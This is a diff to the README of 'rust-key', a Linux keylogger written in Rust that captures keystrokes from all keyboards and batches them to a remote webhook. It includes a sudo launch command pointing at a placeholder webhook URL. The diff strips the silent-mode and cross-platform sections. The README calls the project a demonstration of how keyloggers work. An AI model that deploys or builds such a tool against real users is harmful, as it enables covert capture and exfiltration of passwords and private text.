@@ -22,7 +22,6 @@ This project demonstrates how keyloggers work at a low level on Linux systems us
 - **Multiple Keyboard Support**: Monitors all keyboards simultaneously
 - **Webhook Integration**: Send keystroke data to a remote endpoint for analysis
 - **Efficient Batching**: Groups keystrokes to minimize network overhead
-- **Cross-Platform Ready**: Includes dependencies for Windows and macOS (Linux fully implemented)
 
 ## How It Works
 
@@ -69,7 +68,7 @@ sudo ./target/release/rust-key https://your-webhook-url.com/endpoint
 Keystrokes are logged to `keylog.txt` in the current directory with this format:
 
 ```
-=== Keylogger Started at 2024-01-01 12:00:00 ===
+=== Keylogger Started at 2026-01-01 12:00:00 ===
 Locale: en_US.UTF-8
 [2024-01-01 12:00:05.123] [USB Keyboard] Key: h
 [2024-01-01 12:00:05.234] [USB Keyboard] Key: e
@@ -95,24 +94,6 @@ This will:
 - Start the keylogger with sudo
 - Create a stop script
 
-#### Silent Mode (`run_silent.sh`)
-Runs without prompts (requires sudo upfront):
-
-```bash
-# Without webhook
-sudo ./run_silent.sh
-
-# With webhook
-sudo ./run_silent.sh https://your-webhook-url.com/endpoint
-```
-
-### Testing Webhook Connectivity
-
-Before running with webhook support, test your endpoint:
-
-```bash
-./test_webhook.sh https://your-webhook-url.com/endpoint
-```
 
 ## Webhook Format
 
@@ -231,11 +212,8 @@ rust-key/
 ├── src/
 │   ├── main.rs         # Entry point and argument parsing
 │   ├── linux.rs        # Linux/evdev implementation
-│   ├── windows.rs      # Windows stub (future)
-│   └── macos.rs        # macOS stub (future)
+│  
 ├── run.sh              # Interactive launcher script
-├── run_silent.sh       # Silent launcher script
-├── test_webhook.sh     # Webhook testing utility
 ├── Cargo.toml          # Rust dependencies
 └── README.md           # This file
 ```
